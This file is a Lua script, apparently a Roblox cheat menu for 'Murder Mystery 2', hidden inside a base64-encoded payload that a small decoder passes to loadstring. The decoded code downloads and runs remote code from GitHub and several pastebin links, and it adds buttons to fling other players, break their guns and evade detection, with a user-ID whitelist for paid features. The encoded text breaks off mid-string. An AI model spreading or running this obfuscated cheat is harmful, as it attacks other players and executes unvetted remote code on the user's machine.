local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function dec(data)
  data = string.gsub(data, '[^'..b..'=]', '')
  return (data:gsub('.', function(x)
    if x == '=' then return '' end
    local r,f='',(b:find(x)-1)
    for i=6,1,-1 do r=r..(f%2^i - f%2^(i-1) > 0 and '1' or '0') end
    return r;
  end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
    if #x ~= 8 then return '' end
    local c=0
    for i=1,8 do c=c + (x:sub(i,i)=='1' and 2^(8-i) or 0) end
    return string.char(c)
  end))
end
loadstring(dec("cmVwZWF0IHRhc2sud2FpdCgxKSB1bnRpbCBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOyBsb2NhbCBTdGFydGVyR3VpID0gZ2FtZTpHZXRTZXJ2aWNlKCJTdGFydGVyR3VpIik7IGxvY2FsIGZ1bmN0aW9uIE5vdGlmeShUaXRsZSwgTWVzc2FnZSwgVGltZSkgU3RhcnRlckd1aTpTZXRDb3JlKCJTZW5kTm90aWZpY2F0aW9uIiwge1RpdGxlID0gVGl0bGUsIFRleHQgPSBNZXNzYWdlLCBEdXJhdGlvbiA9IFRpbWUgb3IgNX0pIGVuZDsgaWYgX0cuY2FweSB0aGVuIHJldHVybiBOb3RpZnkoIkFscmVhZHkgTG9hZGVkIiwgIlJlam9pbiB0byBjb250aW51ZS4iKSBlbHNlIF9HLmNhcHkgPSB0cnVlIGVuZApsb2NhbCBMaWJyYXJ5ID0gbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9ucGMxMjMyL1UvcmVmcy9oZWFkcy9tYWluL1Byb3RlY3RlZF8xNjMzNDY0ODM1NTgyNzI3Lmx1YS50eHQiLCB0cnVlKSkoKQpsb2NhbCBhbGxvd2VkVXNlcklkcyA9IHsKIDI3ODQ2NjM4NjcsIDE0Nzg2NjY4MDksIDEwOTc0NzM0MjYsIDk4NzY1NDMyMSwgMTExODIwMDA1NywgNzEzOTkxMjIzMCwgMzA4MTI3NjM3OSwgMzA3MTc0NDE5NCwgODE3NTk1NzI1NiwKICAgIDI0NTI1OTEwMDAsIDYwMTAyNDYwNTQsIDQ1NTk0MTY3NTcsIDUwMzI4OTA2NzksIDQwODA0NDE5NSwgNzIxMDY3MjMxNCwgODI1NDM5MDk2OSwgMzI0MzM1MjUxOSwgNzQ3NTk0NTE1MCwKICAgIDc5MjI3Mzk2MzgsIDEyMzQ1Njc4OTAsIDExMjIzMzQ0NTUsIDQyMjk1NDI2OTcsIDI2NDI1NTcyNTgsIDIzMDk1OTMwNjIsIDM0NDIzOTc2NTQsIAozODk4NTExNjYyLCA0NjA0MzUxNzY1LCAxODk1NjcyMDUyLCAxNzQ5NzkyOTQKfQoKbG9jYWwgY3IgPSBjbG9uZXJlZiBvciBmdW5jdGlvbihvKSByZXR1cm4gbyBlbmQKZ2V0Z2VudigpLlBsYXllcnMgPSBjbG9uZXJlZihnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKSkKZ2V0Z2VudigpLldvcmtzcGFjZSA9IGNsb25lcmVmKGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIikpCmdldGdlbnYoKS5SZXBsaWNhdGVkU3RvcmFnZSA9IGNsb25lcmVmKGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKSkKZ2V0Z2VudigpLlJ1blNlcnZpY2UgPSBjbG9uZXJlZihnYW1lOkdldFNlcnZpY2UoIlJ1blNlcnZpY2UiKSkKZ2V0Z2VudigpLkxpZ2h0aW5nID0gY2xvbmVyZWYoZ2FtZTpHZXRTZXJ2aWNlKCJMaWdodGluZyIpKQpnZXRnZW52KCkuVUlTID0gY2xvbmVyZWYoZ2FtZTpHZXRTZXJ2aWNlKCJVc2VySW5wdXRTZXJ2aWNlIikpCmdldGdlbnYoKS5TY3JpcHRDb250ZXh0ID0gY2xvbmVyZWYoZ2FtZTpHZXRTZXJ2aWNlKCJTY3JpcHRDb250ZXh0IikpCmdldGdlbnYoKS5DYW1lcmEgPSBjbG9uZXJlZihnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpLkN1cnJlbnRDYW1lcmEpCmdldGdlbnYoKS5wbGF5ZXIgPSBjbG9uZXJlZihnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllcikKZ2V0Z2VudigpLk1vdXNlID0gZ2V0Z2VudigpLnBsYXllcjpHZXRNb3VzZSgpCmdldGdlbnYoKS5UZXJyYWluID0gY2xvbmVyZWYoZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKS5UZXJyYWluKQpnZXRnZW52KCkuVmlydHVhbFVzZXIgPSBjbG9uZXJlZihnYW1lOkdldFNlcnZpY2UoIlZpcnR1YWxVc2VyIikpCmdldGdlbnYoKS5Mb2NhbFBsYXllciA9IGdldGdlbnYoKS5wbGF5ZXIKZ2V0Z2VudigpLlBsYXllclNjcmlwdHMgPSBjbG9uZXJlZihnZXRnZW52KCkucGxheWVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiUGxheWVyU2NyaXB0cyIpKQpnZXRnZW52KCkuUmF3TWV0YXRhYmxlID0gZ2V0cmF3bWV0YXRhYmxlKGdhbWUpCmdldGdlbnYoKS5PbGROYW1lQ2FsbCA9IGdldHJhd21ldGF0YWJsZShnYW1lKS5fX25hbWVjYWxsCmdldGdlbnYoKS5Vc2VySW5wdXRTZXJ2aWNlID0gY2xvbmVyZWYoZ2FtZTpHZXRTZXJ2aWNlKCJVc2VySW5wdXRTZXJ2aWNlIikpCmxvY2FsIFBsYXllcnMgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQpsb2NhbCBSdW5TZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJSdW5TZXJ2aWNlIikKbG9jYWwgQ2FtZXJhID0gd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEKbG9jYWwgTG9jYWxQbGF5ZXIgPSBQbGF5ZXJzLkxvY2FsUGxheWVyCmxvY2FsIFRlbGVwb3J0U2VydmljZSA9IGNsb25lcmVmKGdhbWU6R2V0U2VydmljZSgiVGVsZXBvcnRTZXJ2aWNlIikpCmxvY2FsIENvcmVHdWkgPSBjbG9uZXJlZihnYW1lOkdldFNlcnZpY2UoIkNvcmVHdWkiKSkKbG9jYWwgUlMgPSBjbG9uZXJlZihnYW1lOkdldFNlcnZpY2UoIlJ1blNlcnZpY2UiKSkKbG9jYWwgUmVwbGljYXRlZFN0b3JhZ2UgPSBjbG9uZXJlZihnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikpCgpsb2NhbCBjYXB5ID0gTGlicmFyeTpDcmVhdGVVSSgiTXVyZGVyIE15c3RlcnkgMiAvIDIxMCIsICJCeSBDYXB5YmFyYVNjcmlwdCIsIGFsbG93ZWRVc2VySWRzKQoKZ2V0Z2VudigpLnRhYjEsIGdldGdlbnYoKS50YWIyLCBnZXRnZW52KCkudGFiMTAsIGdldGdlbnYoKS50YWIzLCBnZXRnZW52KCkudGFiMTMsIGdldGdlbnYoKS50YWIxMiwgZ2V0Z2VudigpLnRhYjQsIGdldGdlbnYoKS50YWI1LCBnZXRnZW52KCkudGFiNiwgZ2V0Z2VudigpLnRhYjcsIGdldGdlbnYoKS50YWI4ID0gY2FweTpBZGRUYWIoZmFsc2UsICJDb21iYXQiKSwgY2FweTpBZGRUYWIoZmFsc2UsICJIaXRib3ggZXhwYW5kZXIiKSwgY2FweTpBZGRUYWIoZmFsc2UsICJPcHRpbWl6YXRpb24iKSwgY2FweTpBZGRUYWIoZmFsc2UsICJWaXN1YWwiKSwgY2FweTpBZGRUYWIoZmFsc2UsICJUcm9sbHMgVGFiIiksIGNhcHk6QWRkVGFiKHRydWUsICJERUxVWEUiKSwgY2FweTpBZGRUYWIoZmFsc2UsICJUZWxlcG9ydCIpLCBjYXB5OkFkZFRhYihmYWxzZSwgIkF1dG8gRmFybSIpLCBjYXB5OkFkZFRhYihmYWxzZSwgIkxvY2FsIFBsYXllciIpLCBjYXB5OkFkZFRhYihmYWxzZSwgIkVtb3RlIiksIGNhcHk6QWRkVGFiKGZhbHNlLCAiQWN0TWdyIikKZ2V0Z2VudigpLmNvbmZpZ0ZpbGVOYW1lID0gImNvbmZpZ21tMi50eHQiCgpnZXRnZW52KCkuc2F2ZUNvbmZpZyA9IGZ1bmN0aW9uKHN0YXRlVGFibGUpCiAgICB3cml0ZWZpbGUoZ2V0Z2VudigpLmNvbmZpZ0ZpbGVOYW1lLCBnYW1lLkh0dHBTZXJ2aWNlOkpTT05FbmNvZGUoc3RhdGVUYWJsZSkpCmVuZAoKZ2V0Z2VudigpLmxvYWRDb25maWcgPSBmdW5jdGlvbigpCiAgICBpZiBpc2ZpbGUoZ2V0Z2VudigpLmNvbmZpZ0ZpbGVOYW1lKSB0aGVuCiAgICAgICAgbG9jYWwgc3VjY2VzcywgZGF0YSA9IHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgcmV0dXJuIGdhbWUuSHR0cFNlcnZpY2U6SlNPTkRlY29kZShyZWFkZmlsZShnZXRnZW52KCkuY29uZmlnRmlsZU5hbWUpKQogICAgICAgIGVuZCkKCiAgICAgICAgaWYgc3VjY2VzcyBhbmQgdHlwZShkYXRhKSA9PSAidGFibGUiIHRoZW4KICAgICAgICAgICAgcmV0dXJuIGRhdGEKICAgICAgICBlbmQKICAgIGVuZAogICAgcmV0dXJuIHt9CmVuZAoKZ2V0Z2VudigpLnNhdmVkQ29uZmlnID0gZ2V0Z2VudigpLmxvYWRDb25maWcoKQoKdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICB3aGlsZSB0YXNrLndhaXQoMTApIGRvCiAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgIHByaW50KCJzZSBndWFyZG8gbGFzIGNvbmZpZyIpCiAgICAgICAgICAgIHdyaXRlZmlsZShnZXRnZW52KCkuY29uZmlnRmlsZU5hbWUsIGdhbWUuSHR0cFNlcnZpY2U6SlNPTkVuY29kZShnZXRnZW52KCkuc2F2ZWRDb25maWcpKQogICAgICAgIGVuZCkKICAgIGVuZAplbmQpCgpzZXRmcHNjYXAoMTAwMCkKcHJpbnQoIkZwcyB1bmJsb2NrIikKCmdldGdlbnYoKS5ibG9ja1Bvc2l0aW9uID0gVmVjdG9yMy5uZXcoLTc0LCA2LCA2OTMpCmdldGdlbnYoKS5ibG9ja1NpemUgPSBWZWN0b3IzLm5ldygxMDAsIDIsIDEwMCkKCmlmIG5vdCB3b3Jrc3BhY2U6RmluZEZpcnN0Q2hpbGQoIldpZGVCbG9jayIpIHRoZW4KICAgIEluc3RhbmNlLm5ldygiUGFydCIsIHdvcmtzcGFjZSk6U2V0QXR0cmlidXRlKCJJbml0IiwgdHJ1ZSkKICAgIGxvY2FsIGIgPSB3b3Jrc3BhY2U6R2V0Q2hpbGRyZW4oKVsjd29ya3NwYWNlOkdldENoaWxkcmVuKCldCiAgICBiLk5hbWUsIGIuU2l6ZSwgYi5Qb3NpdGlvbiwgYi5BbmNob3JlZCwgYi5DYW5Db2xsaWRlLCBiLlRyYW5zcGFyZW5jeSA9ICJXaWRlQmxvY2siLCBibG9ja1NpemUsIGJsb2NrUG9zaXRpb24sIHRydWUsIHRydWUsIDAuNQplbmQKCkxpYnJhcnkuYWRkU2VjdGlvbih0YWIxMywgIlRST0xTIFRBQiIpCgpMaWJyYXJ5LmFkZEJ1dHRvbih0YWIxMywgIkFudGkgQmFuZyIsICIiLCBmdW5jdGlvbigpCmxvY2FsIGhycCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydAp3b3Jrc3BhY2UuRmFsbGVuUGFydHNEZXN0cm95SGVpZ2h0ID0gLTEwMDAKbG9jYWwgbGFzdENGcmFtZSA9IGhycC5DRnJhbWUKaHJwLkNGcmFtZSA9IENGcmFtZS5uZXcoVmVjdG9yMy5uZXcoMCwgLTUwMCwgMCkpCnRhc2sud2FpdCgwLjcpCmhycC5DRnJhbWUgPSBsYXN0Q0ZyYW1lCndvcmtzcGFjZS5GYWxsZW5QYXJ0c0Rlc3Ryb3lIZWlnaHQgPSAtNTAwCmVuZCkKCmxvY2FsIGEsIGIsIGMsIGQsIGUsIGYsIGcgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKSwgZ2FtZTpHZXRTZXJ2aWNlKCJUd2VlblNlcnZpY2UiKSwgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIsICIxMDcxNDA2ODIyMiIsICIiLCBuaWwsIG5pbApsb2NhbCBoID0gZmFsc2UKCkxpYnJhcnkuYWRkVGV4dGJveCh0YWIxMywgInB1dCB0aGUgcGxheWVyJ3MgbmFtZSBmb3IgdGhlIGJhbmciLCAiRW50ZXIgdGFyZ2V0IG5hbWUiLCAiIiwgZnVuY3Rpb24oaSkKICAgIGUgPSBpOmxvd2VyKCkKZW5kKQoKTGlicmFyeS5hZGRUb2dnbGUodGFiMTMsICJhY3RpdmF0ZSBiYW5nIiwgIlN0YXJ0IiwgZmFsc2UsIGZ1bmN0aW9uKGopCiAgICBpZiBub3QgaiB0aGVuCiAgICAgICAgaCA9IGZhbHNlCiAgICAgICAgaWYgZyB0aGVuCiAgICAgICAgICAgIGc6U3RvcCgpCiAgICAgICAgICAgIGcgPSBuaWwKICAgICAgICBlbmQKICAgIGVsc2UKICAgICAgICBpZiBlID09ICIiIHRoZW4KICAgICAgICAgICAgcHJpbnQoIk5vIHRhcmdldCBuYW1lIHByb3ZpZGVkLCB1bmFibGUgdG8gYWN0aXZhdGUgYmFuZyIpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGVuZAogICAgICAgIGYgPSBuaWwKICAgICAgICBmb3IgXywgayBpbiBwYWlycyhhOkdldFBsYXllcnMoKSkgZG8KICAgICAgICAgICAgaWYgay5OYW1lOmxvd2VyKCk6ZmluZChlKSBvciBrLkRpc3BsYXlOYW1lOmxvd2VyKCk6ZmluZChlKSB0aGVuCiAgICAgICAgICAgICAgICBmID0gawogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgaWYgZiBhbmQgZi5DaGFyYWN0ZXIgdGhlbgogICAgICAgICAgICBoID0gdHJ1ZQogICAgICAgICAgICBsb2NhbCBsID0gYy5DaGFyYWN0ZXIKICAgICAgICAgICAgaWYgbCB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCBtID0gbDpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikKICAgICAgICAgICAgICAgIGlmIG0gdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIG4gPSBJbnN0YW5jZS5uZXcoIkFuaW1hdGlvbiIpCiAgICAgICAgICAgICAgICAgICAgbi5BbmltYXRpb25JZCA9ICJyYnhhc3NldGlkOi8vIiAuLiBkCiAgICAgICAgICAgICAgICAgICAgZyA9IG06TG9hZEFuaW1hdGlvbihuKQogICAgICAgICAgICAgICAgICAgIGc6UGxheSgpCiAgICAgICAgICAgICAgICAgICAgZzpBZGp1c3RTcGVlZCgyKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBjb3JvdXRpbmUud3JhcChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICB3aGlsZSBoIGRvCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgbyA9IGYuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgcCA9IGMuQ2hhcmFjdGVyCgogICAgICAgICAgICAgICAgICAgIGlmIG8gYW5kIG86RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSBhbmQgcCBhbmQgcDpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgcSA9IG8uSHVtYW5vaWRSb290UGFydAogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCByID0gcC5IdW1hbm9pZFJvb3RQYXJ0CgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBzID0gcS5DRnJhbWUgKiBDRnJhbWUubmV3KDAsIDAsIDEpCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHQgPSBxLkNGcmFtZSAqIENGcmFtZS5uZXcoMCwgMCwgMi41KQoKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdSA9IGI6Q3JlYXRlKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgciwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFR3ZWVuSW5mby5uZXcoMC4yLCBFbnVtLkVhc2luZ1N0eWxlLkxpbmVhciwgRW51bS5FYXNpbmdEaXJlY3Rpb24uT3V0KSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtDRnJhbWUgPSBzfQogICAgICAgICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICAgICAgICAgIHU6UGxheSgpCiAgICAgICAgICAgICAgICAgICAgICAgIHUuQ29tcGxldGVkOldhaXQoKQoKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdiA9IGI6Q3JlYXRlKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgciwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFR3ZWVuSW5mby5uZXcoMC4yLCBFbnVtLkVhc2luZ1N0eWxlLkxpbmVhciwgRW51bS5FYXNpbmdEaXJlY3Rpb24uT3V0KSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHtDRnJhbWUgPSB0fQogICAgICAgICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICAgICAgICAgIHY6UGxheSgpCiAgICAgICAgICAgICAgICAgICAgICAgIHYuQ29tcGxldGVkOldhaXQoKQogICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgaCA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKSgpCiAgICAgICAgZWxzZQogICAgICAgICAgICBwcmludCgiVGFyZ2V0IG5vdCBmb3VuZCEiKQogICAgICAgIGVuZAogICAgZW5kCmVuZCkKCmxvY2FsIGEgPSBnZXRnZW52KCkuc2F2ZWRDb25maWcuaW52cyBvciBmYWxzZQpMaWJyYXJ5LmFkZFRvZ2dsZSh0YWIxMywgIkludmlzaWJsZSBmZSIsICIiLCBhLCBmdW5jdGlvbihiKQogICAgYSA9IGIKICAgIGdldGdlbnYoKS5zYXZlZENvbmZpZy5pbnZzID0gYgogICAgZ2V0Z2VudigpLnNhdmVDb25maWcoZ2V0Z2VudigpLnNhdmVkQ29uZmlnKQoKICAgIGxvY2FsIGMgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIKICAgIGxvY2FsIGQgPSBjLkNoYXJhY3RlciBvciBjLkNoYXJhY3RlckFkZGVkOldhaXQoKQogICAgbG9jYWwgZQogICAgaWYgYSB0aGVuCiAgICAgICAgZSA9IGQuSHVtYW5vaWRSb290UGFydC5DRnJhbWUKICAgICAgICBkOk1vdmVUbyhWZWN0b3IzLm5ldygtMjUuOTUsIDg0LCAzNTM3LjU1KSkKICAgICAgICB0YXNrLndhaXQoLjEwKQogICAgICAgIGxvY2FsIGYgPSBJbnN0YW5jZS5uZXcoJ1NlYXQnLCBnYW1lLldvcmtzcGFjZSkKICAgICAgICBmLkFuY2hvcmVkID0gZmFsc2UKICAgICAgICBmLkNhbkNvbGxpZGUgPSBmYWxzZQogICAgICAgIGYuTmFtZSA9ICd4ZCcKICAgICAgICBmLlRyYW5zcGFyZW5jeSA9IDEKICAgICAgICBmLlBvc2l0aW9uID0gVmVjdG9yMy5uZXcoLTI1Ljk1LCA4NCwgMzUzNy41NSkKICAgICAgICBsb2NhbCBnID0gSW5zdGFuY2UubmV3KCJXZWxkIiwgZikKICAgICAgICBnLlBhcnQwID0gZgogICAgICAgIGcuUGFydDEgPSBkLkh1bWFub2lkUm9vdFBhcnQKICAgICAgICB0YXNrLndhaXQoKQogICAgICAgIGQuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgPSBlCiAgICBlbHNlCiAgICAgICAgbG9jYWwgaCA9IHdvcmtzcGFjZTpGaW5kRmlyc3RDaGlsZCgneGQnKQogICAgICAgIGlmIGggdGhlbgogICAgICAgICAgICBoOkRlc3Ryb3koKQogICAgICAgIGVuZAogICAgZW5kCmVuZCkKCmxvY2FsIGEgPSBnZXRnZW52KCkuc2F2ZWRDb25maWcuaGlkZGVuZmxpbmcgb3IgZmFsc2UKTGlicmFyeS5hZGRUb2dnbGUodGFiMTMsICJXYWxrIGZsaW5nIiwgIiIsIGEsIGZ1bmN0aW9uKGIpCiAgICBhID0gYgogICAgZ2V0Z2VudigpLnNhdmVkQ29uZmlnLmhpZGRlbmZsaW5nID0gYgogICAgZ2V0Z2VudigpLnNhdmVDb25maWcoZ2V0Z2VudigpLnNhdmVkQ29uZmlnKQoKICAgIGlmIGEgdGhlbgogICAgICAgIGNvcm91dGluZS53cmFwKGZ1bmN0aW9uKCkKICAgICAgICAgICAgbG9jYWwgYyA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKICAgICAgICAgICAgd2hpbGUgYSBkbwogICAgICAgICAgICAgICAgUnVuU2VydmljZS5IZWFydGJlYXQ6V2FpdCgpCiAgICAgICAgICAgICAgICBpZiBub3QgYSB0aGVuIGJyZWFrIGVuZAogICAgICAgICAgICAgICAgbG9jYWwgZCA9IGMuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICBsb2NhbCBlID0gZCBhbmQgZDpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgICAgICBpZiBlIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCBmID0gZS5WZWxvY2l0eQogICAgICAgICAgICAgICAgICAgIGUuVmVsb2NpdHkgPSBmICogMjAwMCArIFZlY3RvcjMubmV3KDAsIDIwMDAsIDApCiAgICAgICAgICAgICAgICAgICAgUnVuU2VydmljZS5SZW5kZXJTdGVwcGVkOldhaXQoKQogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBhIHRoZW4gYnJlYWsgZW5kCiAgICAgICAgICAgICAgICAgICAgZS5WZWxvY2l0eSA9IGYKICAgICAgICAgICAgICAgICAgICBSdW5TZXJ2aWNlLlN0ZXBwZWQ6V2FpdCgpCiAgICAgICAgICAgICAgICAgICAgaWYgbm90IGEgdGhlbiBicmVhayBlbmQKICAgICAgICAgICAgICAgICAgICBlLlZlbG9jaXR5ID0gZiArIFZlY3RvcjMubmV3KDAsIDAuMSwgMCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpKCkKICAgIGVuZAplbmQpCgpMaWJyYXJ5LmFkZEJ1dHRvbih0YWIxMywgImZsaW5nIGFsbCIsICJGbGluZyBhIHRvZG9zIiwgZnVuY3Rpb24oKQogICAgbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9IcE5mMFRZWCIpKSgpCmVuZCkKCkxpYnJhcnkuYWRkQnV0dG9uKHRhYjEzLCAiRmxpbmcgbXVyZGVyZXIiLCAiIiwgZnVuY3Rpb24oKQogICAgbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcGFzdGViaW4uY29tL3Jhdy9ZS1RZcDVEbiIpKSgpCmVuZCkKCkxpYnJhcnkuYWRkQnV0dG9uKHRhYjEzLCAiRmxpbmcgc2hlcmlmZiIsICIiLCBmdW5jdGlvbigpCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0x4OFVrdlZ2IikpKCkKZW5kKQoKTGlicmFyeS5hZGRTZWN0aW9uKHRhYjEyLCAiREVMVVhFICgxNzAgcm9idXgpIikKCmdldGdlbnYoKS5hbCA9IG5pbApnZXRnZW52KCkubSA9IG5pbAoKbG9jYWwgZnVuY3Rpb24gYyhuLCBwKQoJaWYgbm90IChuIGFuZCBwKSB0aGVuIHJldHVybiBlbmQKCWZvciBfLCBkIGluIHBhaXJzKHtwLkNoYXJhY3RlciwgcDpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkJhY2twYWNrIil9KSBkbwoJCWlmIGQgdGhlbgoJCQlsb2NhbCBlID0gZDpGaW5kRmlyc3RDaGlsZChuKQoJCQlpZiBlIGFuZCBlOklzQSgiVG9vbCIpIHRoZW4KCQkJCWlmIG4gPT0gIkd1biIgdGhlbgoJCQkJCWxvY2FsIGYgPSBlOkZpbmRGaXJzdENoaWxkKCJLbmlmZVNlcnZlciIpCgkJCQkJbG9jYWwgZyA9IGU6RmluZEZpcnN0Q2hpbGQoIktuaWZlTG9jYWwiKQoJCQkJCWlmIGYgYW5kIGcgdGhlbgoJCQkJCQlsb2NhbCBoID0gKHAgPT0gTG9jYWxQbGF5ZXIgYW5kIGc6RmluZEZpcnN0Q2hpbGQoIkNyZWF0ZUJlYW0iKSBhbmQgZy5DcmVhdGVCZWFtLlJlbW90ZUZ1bmN0aW9uKQoJCQkJCQkJb3IgZjpGaW5kRmlyc3RDaGlsZCgiU2hvb3RHdW4iKQoJCQkJCQlpZiBoIHRoZW4gcmV0dXJuIGggZW5kCgkJCQkJZW5kCgkJCQllbHNlaWYgbiA9PSAiS25pZmUiIHRoZW4KCQkJCQlyZXR1cm4gdHJ1ZQoJCQkJZW5kCgkJCWVuZAoJCWVuZAoJZW5kCmVuZAoKbG9jYWwgZnVuY3Rpb24gaShpZCkKCWZvciBfLCB2IGluIGlwYWlycyhhbGxvd2VkVXNlcklkcykgZG8KCQlpZiBpZCA9PSB2IHRoZW4gcmV0dXJuIHRydWUgZW5kCgllbmQKCXJldHVybiBmYWxzZQplbmQKCmdldGdlbnYoKS5rID0gZ2V0Z2VudigpLnNhdmVkQ29uZmlnLkJyZWFrR3VuTXVyZGVyZXJPbmx5IG9yIGZhbHNlCmdldGdlbnYoKS5sID0gZ2V0Z2VudigpLnNhdmVkQ29uZmlnLkJyZWFrR3VuQWxsUGxheWVycyBvciBmYWxzZQoKTGlicmFyeS5hZGRUb2dnbGUodGFiMTIsICJCcmVhayBHdW4gKE11cmRlcmVyIE9ubHkpIiwgIiIsIGdldGdlbnYoKS5rLCBmdW5jdGlvbih4KQoJaWYgeCBhbmQgbm90IGkoTG9jYWxQbGF5ZXIuVXNlcklkKSB0aGVuCgkJZ2V0Z2VudigpLmsgPSBmYWxzZQoJCWdldGdlbnYoKS5sID0gZmFsc2UKCQlnZXRnZW52KCkuc2F2ZWRDb25maWcuQnJlYWtHdW5NdXJkZXJlck9ubHkgPSBmYWxzZQoJCWdldGdlbnYoKS5zYXZlZENvbmZpZy5CcmVha0d1bkFsbFBsYXllcnMgPSBmYWxzZQoJCWdldGdlbnYoKS5zYXZlQ29uZmlnKGdldGdlbnYoKS5zYXZlZENvbmZpZykKCQlpZiBnZXRnZW52KCkuYWwgdGhlbiBnZXRnZW52KCkuYWw6RGlzY29ubmVjdCgpIGdldGdlbnYoKS5hbCA9IG5pbCBlbmQKCQlpZiBnZXRnZW52KCkubSB0aGVuIGdldGdlbnYoKS5tOkRpc2Nvbm5lY3QoKSBnZXRnZW52KCkubSA9IG5pbCBlbmQKCQlMb2NhbFBsYXllcjpLaWNrKCJ0cnlpbmcgdG8gYnlwYXNzIikKCQlyZXR1cm4KCWVuZAoKCWdldGdlbnYoKS5rID0geAoJZ2V0Z2VudigpLnNhdmVkQ29uZmlnLkJyZWFrR3VuTXVyZGVyZXJPbmx5ID0geAoJZ2V0Z2VudigpLnNhdmVDb25maWcoZ2V0Z2VudigpLnNhdmVkQ29uZmlnKQoJaWYgZ2V0Z2VudigpLmFsIHRoZW4gZ2V0Z2VudigpLmFsOkRpc2Nvbm5lY3QoKSBnZXRnZW52KCkuYWwgPSBuaWwgZW5kCgoJaWYgeCB0aGVuCgkJbG9jYWwgdCA9IDAKCQlnZXRnZW52KCkuYWwgPSBSdW5TZXJ2aWNlLkhlYXJ0YmVhdDpDb25uZWN0KGZ1bmN0aW9uKGR0KQoJCQl0ICs9IGR0CgkJCWlmIHQgPCAwLjEgdGhlbiByZXR1cm4gZW5kCgkJCXQgPSAwCgkJCXByaW50KCJIZWFydGJlYXQgKE11cmRlcmVyIE9ubHkpIikKCgkJCWlmIG5vdCBnZXRnZW52KCkuayB0aGVuIGdldGdlbnYoKS5hbDpEaXNjb25uZWN0KCkgZ2V0Z2VudigpLmFsID0gbmlsIHJldHVybiBlbmQKCQkJaWYgYygiS25pZmUiLCBMb2NhbFBsYXllcikgdGhlbgoJCQkJZm9yIF8sIHBsIGluIHBhaXJzKFBsYXllcnM6R2V0UGxheWVycygpKSBkbwoJCQkJCWlmIHBsIH49IExvY2FsUGxheWVyIHRoZW4KCQkJCQkJbG9jYWwgaHJwID0gcGwuQ2hhcmFjdGVyIGFuZCBwbC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQoJCQkJCQlsb2NhbCBndW4gPSBjKCJHdW4iLCBwbCkKCQkJCQkJaWYgaHJwIGFu